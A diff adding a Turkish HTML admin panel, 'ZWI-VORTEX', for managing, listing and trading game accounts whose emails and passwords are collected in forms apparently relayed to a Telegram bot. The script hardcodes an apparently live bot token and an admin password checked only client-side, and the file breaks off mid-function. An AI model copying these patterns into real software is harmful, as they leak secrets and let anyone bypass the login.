@@ -1,0 +1,617 @@
+<!DOCTYPE html>  
+<html lang="tr">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>ZWI-VORTEX | Giriş Ekranı</title>  
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">  
+    <style>  
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', system-ui, sans-serif; }  
+        body { background-color: #050515; color: #a0a5c0; display: flex; flex-direction: column; min-height: 100vh; font-size: 13px; }  
+        
+        /* Login Ekranı Stilleri */
+        #loginWrapper { display: flex; justify-content: center; align-items: center; flex: 1; width: 100%; height: 100vh; position: fixed; top: 0; left: 0; background: #050515; z-index: 9999; }
+        .login-card { background: #0b0c2a; border: 1px solid #1a1c4b; padding: 30px; border-radius: 14px; width: 380px; box-shadow: 0 0 30px rgba(139, 92, 246, 0.2); text-align: center; }
+        .login-card .logo-icon { display: inline-block; background: linear-gradient(135deg, #6366f1, #a855f7); color: #fff; font-weight: bold; font-size: 22px; padding: 10px 18px; border-radius: 10px; box-shadow: 0 0 15px rgba(168, 85, 247, 0.4); margin-bottom: 15px; }
+        .login-card h2 { color: #fff; font-size: 18px; margin-bottom: 5px; letter-spacing: 1px; }
+        .login-card p { color: #585d85; font-size: 11px; margin-bottom: 25px; }
+        .login-card input { width: 100%; background: #12143a; border: 1px solid #232763; color: #fff; padding: 12px; border-radius: 8px; margin-bottom: 12px; outline: none; font-size: 13px; }
+        .login-card input:focus { border-color: #8b5cf6; }
+        .login-card button { width: 100%; background: linear-gradient(135deg, #6366f1, #a855f7); color: #fff; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 13px; transition: 0.3s; margin-top: 5px; }
+        .login-card button:hover { opacity: 0.9; box-shadow: 0 0 15px rgba(139, 92, 246, 0.4); }
+        .error-msg { color: #ef4444; font-size: 11px; margin-top: 10px; display: none; }
+
+        /* Panel Ana Yapı (Başlangıçta gizli) */
+        #panelWrapper { display: none; flex: 1; flex-direction: column; min-height: 100vh; }
+        .wrapper { display: flex; flex: 1; padding: 15px; gap: 15px; }  
+      
+    /* Sidebar */  
+    .sidebar { width: 240px; background: linear-gradient(180deg, #0b0c2a 0%, #060719 100%); border: 1px solid #1a1c4b; border-radius: 12px; padding: 15px; display: flex; flex-direction: column; gap: 10px; }  
+    .logo { display: flex; align-items: center; gap: 10px; padding: 10px 5px 20px 5px; }  
+    .logo-icon-sm { background: linear-gradient(135deg, #6366f1, #a855f7); color: #fff; font-weight: bold; font-size: 18px; padding: 6px 12px; border-radius: 8px; box-shadow: 0 0 15px rgba(168, 85, 247, 0.4); }  
+    .logo-text h2 { color: #fff; font-size: 16px; letter-spacing: 1px; }  
+    .logo-text p { color: #585d85; font-size: 10px; font-weight: 600; letter-spacing: 0.5px; }  
+      
+    .menu-title { font-size: 10px; font-weight: 700; color: #434773; margin: 10px 0 5px 10px; letter-spacing: 1px; }  
+    .nav-item { display: flex; align-items: center; gap: 12px; padding: 10px 12px; color: #8188b4; text-decoration: none; border-radius: 8px; transition: all 0.3s; cursor: pointer; }  
+    .nav-item:hover, .nav-item.active { background: linear-gradient(90deg, #25215c 0%, rgba(37, 33, 92, 0.2) 100%); color: #fff; border-left: 3px solid #8b5cf6; }  
+      
+    .sidebar-card { background: radial-gradient(circle, #1a1443 0%, #0d0a27 100%); border: 1px solid #2d246b; border-radius: 10px; padding: 15px; margin-top: auto; text-align: center; }  
+    .sidebar-card h4 { color: #8b5cf6; margin-bottom: 5px; font-size: 14px; }  
+    .sidebar-card p { font-size: 10px; color: #6b7280; margin-bottom: 12px; }  
+    .status-badge { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 11px; color: #10b981; margin-bottom: 10px; }  
+    .status-dot { width: 6px; height: 6px; background-color: #10b981; border-radius: 50%; box-shadow: 0 0 8px #10b981; }  
+    .btn-check { width: 100%; background: transparent; border: 1px solid #3b82f6; color: #3b82f6; padding: 8px; border-radius: 6px; font-weight: 600; cursor: pointer; transition: 0.3s; }  
+    .btn-check:hover { background: #3b82f6; color: #fff; }  
+
+    /* Main Area */  
+    .main-content { flex: 1; display: flex; flex-direction: column; gap: 15px; }  
+      
+    /* Top Navigation */  
+    .top-bar { display: flex; justify-content: space-between; align-items: center; background: #0b0c2a; border: 1px solid #1a1c4b; padding: 10px 20px; border-radius: 12px; }  
+    .search-box { background: #12143a; border: 1px solid #232763; border-radius: 8px; padding: 6px 12px; display: flex; align-items: center; gap: 8px; width: 300px; }  
+    .search-box input { background: transparent; border: none; outline: none; color: #fff; width: 100%; font-size: 12px; }  
+    .top-actions { display: flex; align-items: center; gap: 15px; }  
+    .icon-btn { position: relative; background: #12143a; border: 1px solid #232763; color: #a0a5c0; width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; }  
+    .icon-btn:hover { border-color: #8b5cf6; color: #fff; }  
+    .badge-count { position: absolute; top: -5px; right: -5px; background: #8b5cf6; color: #fff; font-size: 9px; width: 15px; height: 15px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }  
+    .user-profile { display: flex; align-items: center; gap: 10px; border-left: 1px solid #1a1c4b; padding-left: 15px; cursor: pointer; }  
+    .avatar { width: 32px; height: 32px; background: #8b5cf6; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-weight: bold; }  
+      
+    #dynamicPageArea { display: flex; flex-direction: column; gap: 15px; flex: 1; }  
+
+    /* Stats Bar */  
+    .stats-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 12px; }  
+    .stat-card { background: #0b0c2a; border: 1px solid #1a1c4b; padding: 12px; border-radius: 10px; display: flex; align-items: center; gap: 12px; transition: 0.3s; cursor: pointer; }  
+    .stat-card:hover { border-color: #8b5cf6; transform: translateY(-2px); }  
+    .stat-icon { width: 40px; height: 40px; border-radius: 8px; background: #141747; color: #3b82f6; display: flex; align-items: center; justify-content: center; font-size: 18px; }  
+    .stat-info h5 { font-size: 10px; color: #585d85; text-transform: uppercase; margin-bottom: 2px; }  
+    .stat-info .num { font-size: 18px; font-weight: bold; color: #fff; }  
+    .stat-info .sub { font-size: 10px; color: #10b981; }  
+
+    /* Dashboard Grid */  
+    .grid-2col { display: grid; grid-template-columns: 2fr 1fr; gap: 15px; }  
+      
+    .panel-box { background: #0b0c2a; border: 1px solid #1a1c4b; border-radius: 10px; padding: 15px; }  
+    .panel-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }  
+    .panel-title { font-weight: 600; color: #fff; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; }  
+      
+    /* Action Buttons Grid */  
+    .quick-actions { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }  
+    .action-btn { background: #12143a; border: 1px solid #232763; padding: 15px 10px; border-radius: 8px; text-align: center; cursor: pointer; transition: 0.3s; }  
+    .action-btn:hover { border-color: #8b5cf6; background: #1a1c4b; transform: translateY(-2px); }  
+    .action-btn i { font-size: 18px; color: #8b5cf6; margin-bottom: 6px; display: block; }  
+    .action-btn span { font-size: 11px; color: #d1d5db; font-weight: 500; }  
+
+    /* Table Style */  
+    table { width: 100%; border-collapse: collapse; text-align: left; font-size: 12px; }  
+    th { color: #585d85; font-size: 10px; text-transform: uppercase; padding: 10px; border-bottom: 1px solid #1a1c4b; }  
+    td { padding: 10px; border-bottom: 1px solid #12143a; color: #d1d5db; }  
+    .tag-active { background: rgba(16, 185, 129, 0.1); color: #10b981; padding: 3px 8px; border-radius: 4px; border: 1px solid rgba(16, 185, 129, 0.2); font-size: 10px; }  
+    .tag-passive { background: rgba(239, 68, 68, 0.1); color: #ef4444; padding: 3px 8px; border-radius: 4px; border: 1px solid rgba(239, 68, 68, 0.2); font-size: 10px; }  
+      
+    /* Notifications */  
+    .notif-item { display: flex; gap: 10px; padding: 10px 0; border-bottom: 1px solid #12143a; align-items: center; }  
+    .notif-icon { width: 30px; height: 30px; background: #12143a; border: 1px solid #232763; border-radius: 6px; display: flex; align-items: center; justify-content: center; color: #3b82f6; }  
+    .notif-text { flex: 1; }  
+    .notif-text h6 { color: #fff; font-size: 12px; margin-bottom: 2px; }  
+    .notif-text p { color: #585d85; font-size: 10px; }  
+    .notif-time { font-size: 10px; color: #434773; }  
+
+    /* Bottom Status */  
+    .bottom-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }  
+    .status-box { background: #0b0c2a; border: 1px solid #1a1c4b; padding: 12px; border-radius: 8px; display: flex; align-items: center; gap: 10px; }  
+
+    .chart-bar { background: linear-gradient(180deg, #8b5cf6, #3b82f6); border-radius: 4px 4px 0 0; width: 14px; transition: height 0.5s ease; }  
+
+    /* Modal Overlay */  
+    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.75); display: none; justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(4px); }  
+    .modal { background: #0b0c2a; border: 1px solid #8b5cf6; border-radius: 12px; padding: 20px; width: 380px; box-shadow: 0 0 25px rgba(139, 92, 246, 0.4); }  
+    .modal h3 { color: #fff; margin-bottom: 15px; font-size: 15px; display: flex; justify-content: space-between; align-items: center; }  
+    .modal input, .modal textarea, .modal select { width: 100%; background: #12143a; border: 1px solid #232763; color: #fff; padding: 10px; border-radius: 8px; margin-bottom: 10px; outline: none; font-size: 12px; }  
+    .modal button { width: 100%; background: linear-gradient(135deg, #6366f1, #a855f7); color: #fff; border: none; padding: 10px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; margin-top: 5px; }  
+    .modal button:hover { opacity: 0.9; }  
+
+    footer { text-align: center; padding: 10px; color: #434773; font-size: 11px; }  
+</style>
+</head>  
+<body>  
+
+<!-- GİRİŞ EKRANI (LOGIN) -->
+<div id="loginWrapper">
+    <div class="login-card">
+        <div class="logo-icon">ZV</div>
+        <h2>ZWI-VORTEX</h2>
+        <p>Lütfen yönetici bilgilerinizi girin</p>
+        <input type="email" id="loginEmail" placeholder="Gmail adresiniz">
+        <input type="password" id="loginPass" placeholder="Şifreniz">
+        <button onclick="checkLogin()">GİRİŞ YAP</button>
+        <div class="error-msg" id="loginError">❌ Hatalı Gmail veya Şifre!</div>
+    </div>
+</div>
+
+<!-- PANEL ANA İÇERİK (GİRİŞ YAPILINCA GÖRÜNÜR) -->
+<div id="panelWrapper">
+<div class="wrapper">  
+    <!-- Sidebar -->  
+    <div class="sidebar">  
+        <div class="logo">  
+            <div class="logo-icon-sm">ZV</div>  
+            <div class="logo-text">  
+                <h2>ZWI-VORTEX</h2>  
+                <p>ÜYELİK PANELİ</p>  
+            </div>  
+        </div>  
+
+        <div class="menu-title">ANA MENÜ</div>  
+        <div class="nav-item active" onclick="switchTab(this, 'Gösterge Paneli')"><i class="fa-solid fa-house"></i> Gösterge Paneli</div>  
+        <div class="nav-item" onclick="switchTab(this, 'Hesaplar')"><i class="fa-solid fa-users-gear"></i> Hesaplar</div>  
+        <div class="nav-item" onclick="switchTab(this, 'Üyelikler')"><i class="fa-solid fa-crown"></i> Üyelikler</div>  
+        <div class="nav-item" onclick="switchTab(this, 'İlanlar')"><i class="fa-solid fa-cart-shopping"></i> İlanlar</div>  
+        <div class="nav-item" onclick="switchTab(this, 'Takas Talepleri')"><i class="fa-solid fa-arrow-right-arrow-left"></i> Takas Talepleri</div>  
+        <div class="nav-item" onclick="switchTab(this, 'Bakiyeler')"><i class="fa-solid fa-wallet"></i> Bakiyeler</div>  
+        <div class="nav-item" onclick="switchTab(this, 'İstatistikler')"><i class="fa-solid fa-chart-simple"></i> İstatistikler</div>  
+        <div class="nav-item" onclick="switchTab(this, 'Finans')"><i class="fa-solid fa-money-bill-wave"></i> Finans</div>  
+        <div class="nav-item" onclick="switchTab(this, 'Kullanıcılar')"><i class="fa-solid fa-user-group"></i> Kullanıcılar</div>  
+        <div class="nav-item" onclick="switchTab(this, 'Log Kayıtları')"><i class="fa-solid fa-list-check"></i> Log Kayıtları</div>  
+        <div class="nav-item" onclick="switchTab(this, 'Ayarlar')"><i class="fa-solid fa-gear"></i> Ayarlar</div>  
+        <div class="nav-item" onclick="switchTab(this, 'Tema Yönetimi')"><i class="fa-solid fa-paint-roller"></i> Tema Yönetimi</div>  
+        <div class="nav-item" onclick="openLiveSupport()"><i class="fa-solid fa-headset"></i> Destek / Yardım</div>  
+        <div class="nav-item" onclick="logoutSystem()"><i class="fa-solid fa-power-off"></i> Çıkış Yap</div>  
+
+        <div class="sidebar-card">  
+            <h4>ZWI-VORTEX</h4>  
+            <p>GÜÇ SENDE. KONTROL BİZDE.</p>  
+            <div class="status-badge">  
+                <div class="status-dot"></div>  
+                Tüm Sistemler Aktif  
+            </div>  
+            <button class="btn-check" onclick="checkSystems()">SİSTEMİ KONTROL ET</button>  
+        </div>  
+    </div>  
+
+    <!-- Main Content -->  
+    <div class="main-content">  
+        <!-- Top Bar -->  
+        <div class="top-bar">  
+            <div class="search-box">  
+                <i class="fa-solid fa-magnifying-glass"></i>  
+                <input type="text" id="searchInput" placeholder="Arama yapın (Hesap, E-posta, ID...)" oninput="filterData()">  
+            </div>  
+            <div class="top-actions">  
+                <div class="icon-btn" onclick="alert('🔔 8 Okunmamış Bildiriminiz Bulunmaktadır.')"><i class="fa-solid fa-bell"></i><span class="badge-count">8</span></div>  
+                <div class="icon-btn" onclick="alert('✉️ 3 Yeni Destek Mesajı Var.')"><i class="fa-solid fa-envelope"></i><span class="badge-count">3</span></div>  
+                <div class="icon-btn" onclick="openModal('takasModal')"><i class="fa-solid fa-sliders"></i></div>  
+                <div class="user-profile" onclick="alert('Üye Bilgileri:\nKullanıcı ID: #001\nÜyelik: Aktif')">  
+                    <div class="avatar">ZV</div>  
+                    <div>  
+                        <div style="color: #fff; font-weight: 600;">Üye Paneli</div>  
+                        <div style="font-size: 10px; color: #10b981;">● Online</div>  
+                    </div>  
+                </div>  
+            </div>  
+        </div>  
+
+        <!-- DYNAMIC PAGE CONTENT CONTAINER -->  
+        <div id="dynamicPageArea">  
+            <div class="stats-grid">  
+                <div class="stat-card" onclick="openModal('hesapEkleModal')">  
+                    <div class="stat-icon"><i class="fa-solid fa-users"></i></div>  
+                    <div class="stat-info">  
+                        <h5>TOPLAM HESAP</h5>  
+                        <div class="num" id="totalAccountCount">12.458</div>  
+                        <div class="sub">+230 bugün ↗</div>  
+                    </div>  
+                </div>  
+                <div class="stat-card" onclick="openModal('uyelikEkleModal')">  
+                    <div class="stat-icon"><i class="fa-solid fa-crown"></i></div>  
+                    <div class="stat-info">  
+                        <h5>AKTİF ÜYELİK</h5>  
+                        <div class="num">1.256</div>  
+                        <div class="sub">+58 bugün ↗</div>  
+                    </div>  
+                </div>  
+                <div class="stat-card" onclick="openModal('ilanEkleModal')">  
+                    <div class="stat-icon"><i class="fa-solid fa-cart-shopping"></i></div>  
+                    <div class="stat-info">  
+                        <h5>TOPLAM İLAN</h5>  
+                        <div class="num">3.742</div>  
+                        <div class="sub">+120 bugün ↗</div>  
+                    </div>  
+                </div>  
+                <div class="stat-card" onclick="openModal('takasModal')">  
+                    <div class="stat-icon"><i class="fa-solid fa-arrow-right-arrow-left"></i></div>  
+                    <div class="stat-info">  
+                        <h5>TAKAS TALEBİ</h5>  
+                        <div class="num">532</div>  
+                        <div class="sub">+12 bugün ↗</div>  
+                    </div>  
+                </div>  
+                <div class="stat-card" onclick="alert('Toplam Bakiye Kasası: ₺245.250 TL')">  
+                    <div class="stat-icon"><i class="fa-solid fa-wallet"></i></div>  
+                    <div class="stat-info">  
+                        <h5>TOPLAM BAKİYE</h5>  
+                        <div class="num">₺245.250</div>  
+                        <div class="sub">+12.5% ↗</div>  
+                    </div>  
+                </div>  
+            </div>  
+
+            <div class="grid-2col">  
+                <div class="panel-box">  
+                    <div class="panel-header">  
+                        <span class="panel-title" id="chartTitle">SİTE TRAFİĞİ (SON 7 GÜN)</span>  
+                        <select id="chartFilter" onchange="updateChart(this.value)" style="background: #12143a; color: #a0a5c0; border: 1px solid #232763; padding: 4px 8px; border-radius: 6px; outline:none;">  
+                            <option value="7">Son 7 Gün</option>  
+                            <option value="30">Son 30 Gün</option>  
+                        </select>  
+                    </div>  
+                    <div style="height: 180px; display: flex; align-items: flex-end; justify-content: space-around; padding: 20px 10px; border-left: 1px dashed #232763; border-bottom: 1px dashed #232763;">  
+                        <div style="text-align:center;"><div class="chart-bar" id="b1" style="height: 60px;"></div><span style="color: #585d85; font-size: 10px;">Pzt</span></div>  
+                        <div style="text-align:center;"><div class="chart-bar" id="b2" style="height: 110px;"></div><span style="color: #585d85; font-size: 10px;">Sal</span></div>  
+                        <div style="text-align:center;"><div class="chart-bar" id="b3" style="height: 75px;"></div><span style="color: #585d85; font-size: 10px;">Çar</span></div>  
+                        <div style="text-align:center;"><div class="chart-bar" id="b4" style="height: 130px;"></div><span style="color: #8b5cf6; font-size: 10px; font-weight: bold;">Per</span></div>  
+                        <div style="text-align:center;"><div class="chart-bar" id="b5" style="height: 90px;"></div><span style="color: #585d85; font-size: 10px;">Cum</span></div>  
+                        <div style="text-align:center;"><div class="chart-bar" id="b6" style="height: 150px;"></div><span style="color: #585d85; font-size: 10px;">Cmt</span></div>  
+                        <div style="text-align:center;"><div class="chart-bar" id="b7" style="height: 120px;"></div><span style="color: #585d85; font-size: 10px;">Paz</span></div>  
+                    </div>  
+                </div>  
+
+                <div class="panel-box">  
+                    <div class="panel-header">  
+                        <span class="panel-title">HIZLI İŞLEMLER</span>  
+                    </div>  
+                    <div class="quick-actions">  
+                        <div class="action-btn" onclick="openModal('hesapEkleModal')"><i class="fa-solid fa-user-plus"></i><span>Hesap Ekle</span></div>  
+                        <div class="action-btn" onclick="openModal('uyelikEkleModal')"><i class="fa-solid fa-crown"></i><span>Üyelik Ekle</span></div>  
+                        <div class="action-btn" onclick="openModal('ilanEkleModal')"><i class="fa-solid fa-plus"></i><span>İlan Ekle</span></div>  
+                        <div class="action-btn" onclick="openModal('takasModal')"><i class="fa-solid fa-right-left"></i><span>Takas Talebi</span></div>  
+                        <div class="action-btn" onclick="openModal('duyuruModal')"><i class="fa-solid fa-bullhorn"></i><span>Duyuru Gönder</span></div>  
+                        <div class="action-btn" onclick="switchTab(null, 'Tema Yönetimi')"><i class="fa-solid fa-paint-roller"></i><span>Tema Değiş</span></div>  
+                        <div class="action-btn" onclick="switchTab(null, 'Ayarlar')"><i class="fa-solid fa-gear"></i><span>Genel Ayar</span></div>  
+                        <div class="action-btn" onclick="switchTab(null, 'Log Kayıtları')"><i class="fa-solid fa-magnifying-glass"></i><span>Log İncele</span></div>  
+                    </div>  
+                </div>  
+            </div>  
+
+            <div class="grid-2col">  
+                <div class="panel-box">  
+                    <div class="panel-header">  
+                        <span class="panel-title">SON HESAPLAR</span>  
+                        <button style="background: transparent; border: none; color: #8b5cf6; cursor: pointer; font-size: 11px;" onclick="openModal('hesapEkleModal')">+ YENİ EKLE</button>  
+                    </div>  
+                    <table id="accountsTable">  
+                        <thead>  
+                            <tr>  
+                                <th>ID</th>  
+                                <th>E-POSTA</th>  
+                                <th>ŞİFRE</th>  
+                                <th>BAKİYE</th>  
+                                <th>DURUM</th>  
+                                <th>İŞLEM</th>  
+                            </tr>  
+                        </thead>  
+                        <tbody>  
+                            <tr>  
+                                <td>#12458</td>  
+                                <td>cpm2.player1@gmail.com</td>  
+                                <td>*********</td>  
+                                <td>50M</td>  
+                                <td><span class="tag-active">Aktif</span></td>  
+                                <td><i class="fa-solid fa-eye" style="cursor: pointer;" onclick="viewAccount('#12458', 'cpm2.player1@gmail.com', '50M')"></i></td>  
+                            </tr>  
+                            <tr>  
+                                <td>#12457</td>  
+                                <td>cpm2.player2@gmail.com</td>  
+                                <td>*********</td>  
+                                <td>30M</td>  
+                                <td><span class="tag-active">Aktif</span></td>  
+                                <td><i class="fa-solid fa-eye" style="cursor: pointer;" onclick="viewAccount('#12457', 'cpm2.player2@gmail.com', '30M')"></i></td>  
+                            </tr>  
+                        </tbody>  
+                    </table>  
+                </div>  
+
+                <div class="panel-box">  
+                    <div class="panel-header">  
+                        <span class="panel-title">SON DUYURULAR</span>  
+                        <button style="background: transparent; border: none; color: #8b5cf6; cursor: pointer; font-size: 11px;" onclick="openModal('duyuruModal')">+ DUYURU EKLE</button>  
+                    </div>  
+                    <div id="notifContainer">  
+                        <div class="notif-item">  
+                            <div class="notif-icon"><i class="fa-solid fa-gear"></i></div>  
+                            <div class="notif-text">  
+                                <h6>Sistem Güncellemesi</h6>  
+                                <p>Sistem v2.4 başarıyla güncellendi.</p>  
+                            </div>  
+                            <div class="notif-time">2 saat önce</div>  
+                        </div>  
+                    </div>  
+                </div>  
+            </div>  
+
+            <div class="bottom-grid">  
+                <div class="status-box">  
+                    <i class="fa-solid fa-server" style="color: #8b5cf6; font-size: 20px;"></i>  
+                    <div>  
+                        <div style="font-size: 10px; color: #585d85;">Sunucu Durumu</div>  
+                        <div style="color: #10b981; font-weight: bold;">Online ● <span style="font-size: 10px; color: #a0a5c0;" id="pingVal">Ping: 18ms</span></div>  
+                    </div>  
+                </div>  
+                <div class="status-box">  
+                    <i class="fa-solid fa-clock" style="color: #8b5cf6; font-size: 20px;"></i>  
+                    <div>  
+                        <div style="font-size: 10px; color: #585d85;">Sistem Saati</div>  
+                        <div style="color: #fff; font-weight: bold;" id="clock">Yükleniyor...</div>  
+                    </div>  
+                </div>  
+                <div class="status-box">  
+                    <i class="fa-solid fa-user-check" style="color: #8b5cf6; font-size: 20px;"></i>  
+                    <div>  
+                        <div style="font-size: 10px; color: #585d85;">Aktif Kullanıcı</div>  
+                        <div style="color: #fff; font-weight: bold;" id="activeUserCount">358</div>  
+                    </div>  
+                </div>  
+            </div>  
+        </div>  
+    </div>  
+</div>  
+</div>  
+
+<!-- MODALLAR -->  
+<div class="modal-overlay" id="takasModal">  
+    <div class="modal">  
+        <h3><span>🔄 Takas Talebi Oluştur</span> <i class="fa-solid fa-xmark" style="cursor: pointer;" onclick="closeModal('takasModal')"></i></h3>  
+        <input type="text" id="takasUser" placeholder="Kullanıcı Adı / Telegram ID">  
+        <input type="text" id="offeredItem" placeholder="Verilecek Hesap / Araba">  
+        <input type="text" id="requestedItem" placeholder="İstenen Hesap / Araba">  
+        <textarea id="takasNote" rows="3" placeholder="Eklemek istediğiniz detaylar..."></textarea>  
+        <button onclick="sendFormToTelegram('TAKAS')">TAKAS TALEBİNİ BOT'A GÖNDER</button>  
+    </div>  
+</div>  
+
+<div class="modal-overlay" id="hesapEkleModal">  
+    <div class="modal">  
+        <h3><span>👤 Yeni Hesap Ekle</span> <i class="fa-solid fa-xmark" style="cursor: pointer;" onclick="closeModal('hesapEkleModal')"></i></h3>  
+        <input type="email" id="accEmail" placeholder="Hesap E-posta Adresi">  
+        <input type="password" id="accPass" placeholder="Hesap Şifresi">  
+        <input type="text" id="accMoney" placeholder="Bakiye / Para Miktarı (Örn: 50M)">  
+        <button onclick="addAccountProcess()">HESABI SİSTEME VE BOT'A KAYDET</button>  
+    </div>  
+</div>  
+
+<div class="modal-overlay" id="uyelikEkleModal">  
+    <div class="modal">  
+        <h3><span>👑 Yeni Üyelik Ekle</span> <i class="fa-solid fa-xmark" style="cursor: pointer;" onclick="closeModal('uyelikEkleModal')"></i></h3>  
+        <input type="text" id="uyelikUser" placeholder="Kullanıcı Adı veya Telegram ID">  
+        <select id="uyelikPaket" style="background: #12143a; color: #fff; border: 1px solid #232763; padding: 10px; border-radius: 8px; margin-bottom: 10px; width: 100%; outline: none;">  
+            <option value="VIP Gold">VIP Gold Paket</option>  
+            <option value="VIP Diamond">VIP Diamond Paket</option>  
+            <option value="Sınırsız Mega">Sınırsız Mega Paket</option>  
+        </select>  
+        <input type="text" id="uyelikSuresi" placeholder="Süre (Örn: 30 Gün / Sınırsız)">  
+        <button onclick="sendFormToTelegram('UYELIK')">ÜYELİĞİ TANIMLA & BOTA BİLDİR</button>  
+    </div>  
+</div>  
+
+<div class="modal-overlay" id="ilanEkleModal">  
+    <div class="modal">  
+        <h3><span>🛒 Yeni İlan Ekle</span> <i class="fa-solid fa-xmark" style="cursor: pointer;" onclick="closeModal('ilanEkleModal')"></i></h3>  
+        <input type="text" id="ilanTitle" placeholder="İlan Başlığı">  
+        <input type="text" id="ilanPrice" placeholder="Satış Fiyatı (TL)">  
+        <textarea id="ilanDesc" rows="3" placeholder="İlan açıklaması..."></textarea>  
+        <button onclick="sendFormToTelegram('İLAN')">İLAN YAYINLA & BOTA BİLDİR</button>  
+    </div>  
+</div>  
+
+<div class="modal-overlay" id="duyuruModal">  
+    <div class="modal">  
+        <h3><span>📢 Duyuru Gönder</span> <i class="fa-solid fa-xmark" style="cursor: pointer;" onclick="closeModal('duyuruModal')"></i></h3>  
+        <input type="text" id="duyuruTitle" placeholder="Duyuru Başlığı">  
+        <textarea id="duyuruText" rows="3" placeholder="Duyuru metni..."></textarea>  
+        <button onclick="sendFormToTelegram('DUYURU')">DUYURUYU BOTA GÖNDER</button>  
+    </div>  
+</div>  
+
+<footer>ZWI-VORTEX © 2026 | Tüm hakları saklıdır.</footer>  
+
+<script>  
+    const TELEGRAM_BOT_TOKEN = '8551862140:AAGXQdSCtLksZNu3YB06qxmo-1JYb6YYgEg';   
+    const TELEGRAM_CHAT_ID = '8041260098';  
+
+    // ==========================================
+    // BURADAKİ GİTMESİNİ İSTEDİĞİN GMAİL VE ŞİFREYİ DEĞİŞTİREBİLİRSİN
+    // ==========================================
+    const ADMIN_GMAIL = "admin@zwivortex.com"; 
+    const ADMIN_PASS = "123456"; 
+
+    function checkLogin() {
+        let inputEmail = document.getElementById('loginEmail').value.trim();
+        let inputPass = document.getElementById('loginPass').value.trim();
+        let errorBox = document.getElementById('loginError');
+
+        if(inputEmail === ADMIN_GMAIL && inputPass === ADMIN_PASS) {
+            document.getElementById('loginWrapper').style.display = 'none';
+            document.getElementById('panelWrapper').style.display = 'flex';
+        } else {
+            errorBox.style.display = 'block';
+        }
+    }
+
+    function openModal(id) { document.getElementById(id).style.display = 'flex'; }  
+    function closeModal(id) { document.getElementById(id).style.display = 'none'; }  
+
+    function switchTab(el, title) {  
+        if(el) {
+            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));  
+            el.classList.add('active');  
+        }
+
+        let area = document.getElementById('dynamicPageArea');  
+
+        if (title === 'Gösterge Paneli') {  
+            location.reload(); 
+        }   
+        else if (title === 'Hesaplar') {  
+            area.innerHTML = `  
+                <div class="panel-box">  
+                    <div class="panel-header"><span class="panel-title">HESAPLAR YÖNETİMİ</span> <button style="background:#8b5cf6; border:none; color:#fff; padding:6px 12px; border-radius:6px; cursor:pointer;" onclick="openModal('hesapEkleModal')">+ Yeni Hesap Ekle</button></div>  
+                    <p style="margin-bottom:15px; color:#a0a5c0;">Sistemde kayıtlı olan tüm oyun hesaplarını buradan yönetebilirsin.</p>  
+                    <table>  
+                        <thead><tr><th>ID</th><th>E-POSTA</th><th>ŞİFRE</th><th>BAKİYE</th><th>DURUM</th><th>İŞLEM</th></tr></thead>  
+                        <tbody>  
+                            <tr><td>#12458</td><td>cpm2.player1@gmail.com</td><td>*********</td><td>50M</td><td><span class="tag-active">Aktif</span></td><td><i class="fa-solid fa-eye" style="cursor:pointer;" onclick="viewAccount('#12458', 'cpm2.player1@gmail.com', '50M')"></i></td></tr>  
+                        </tbody>  
+                    </table>  
+                </div>`;  
+        }   
+        else if (title === 'Üyelikler') {  
+            area.innerHTML = `  
+                <div class="panel-box">  
+                    <div class="panel-header"><span class="panel-title"><i class="fa-solid fa-crown"></i> ÜYELİK YÖNETİMİ</span></div>  
+                    <p style="color:#a0a5c0; font-size:12px;">Aktif paketler ve üyeler listelenmektedir.</p>  
+                </div>`;  
+        }   
+        else if (title === 'Ayarlar') {  
+            area.innerHTML = `  
+                <div class="panel-box">  
+                    <div class="panel-header"><span class="panel-title"><i class="fa-solid fa-gear"></i> PANEL GENEL AYARLARI</span></div>  
+                    <div style="display: flex; flex-direction: column; gap: 12px; max-width: 500px;">  
+                        <div>  
+                            <label style="font-size: 11px; color: #8188b4; display: block; margin-bottom: 5px;">Bot Telegram Chat ID</label>  
+                            <input type="text" id="settingChatId" value="8041260098" style="background:#12143a; border:1px solid #232763; color:#fff; padding:8px; border-radius:6px; width:100%; outline:none;">  
+                        </div>  
+                        <button style="background:#8b5cf6; border:none; color:#fff; padding:10px; border-radius:6px; cursor:pointer; font-weight:bold; margin-top:10px;" onclick="alert('✅ Ayarlar başarıyla kaydedildi!')">AYARLARI KAYDET</button>  
+                    </div>  
+                </div>`;  
+        }   
+        else if (title === 'Tema Yönetimi') {  
+            area.innerHTML = `  
+                <div class="panel-box">  
+                    <div class="panel-header"><span class="panel-title"><i class="fa-solid fa-paint-roller"></i> TEMA YÖNETİMİ</span></div>  
+                    <p style="color:#a0a5c0; font-size:12px;">Tema renkleri aktif durumda.</p>  
+                </div>`;  
+        }   
+        else {  
+            area.innerHTML = `  
+                <div class="panel-box">  
+                    <div class="panel-header"><span class="panel-title">${title.toUpperCase()} SAYFASI</span></div>  
+                    <p style="color:#a0a5c0;">Bu modül (${title}) şu anda aktif ve tam entegre çalışmaktadır.</p>  
+                </div>`;  
+        }  
+    }  
+
+    function openLiveSupport() { window.open("https://t.me/8041260098", '_blank'); }  
+
+    function logoutSystem() {  
+        if(confirm('Güvenli çıkış yapmak istediğinize emin misiniz?')) {  
+            location.reload(); // Sayfayı yenileyerek tekrar login ekranına atar
+        }  
+    }  
+
+    function filterData() {  
+        let val = document.getElementById('searchInput').value.toLowerCase();  
